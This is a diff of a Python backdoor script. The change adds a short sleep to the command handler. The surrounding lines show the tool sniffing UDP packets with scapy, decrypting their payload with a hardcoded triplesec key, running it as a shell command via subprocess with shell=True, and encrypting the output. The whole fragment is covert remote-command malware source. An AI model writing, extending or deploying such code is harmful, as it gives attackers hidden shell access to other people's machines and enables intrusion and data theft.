@@ -6,6 +6,7 @@ import argparse
 import platform
 import subprocess
 import triplesec
+import time
 from ctypes import *
 from scapy.all import *
 
@@ -37,6 +38,7 @@ sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, ar
 def runCommand(packet):
   encryptedData = packet['Raw'].load
   data = triplesec.decrypt(encryptedData, b'key yo')
+  time.sleep(0.1)
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
   encryptedOutput = triplesec.encrypt(output, b'key yo')
